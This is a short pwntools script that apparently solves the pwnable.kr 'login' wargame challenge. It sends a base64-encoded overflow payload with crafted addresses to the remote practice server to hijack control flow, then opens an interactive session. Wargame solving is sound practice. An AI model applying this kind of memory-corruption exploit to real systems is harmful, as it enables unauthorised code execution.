#!/usr/bin/python3
from pwn import *
from base64 import *
context.log_level='debug'
# context.arch=''
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./login')
p=remote("pwnable.kr", 9003)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

sla(" : ", b64encode(flat([0x08049284,0xdeadbeef,0x811eb40-4])) )
# sla(" : ", b64encode(flat(0,0)+b'\0'))


p.interactive()
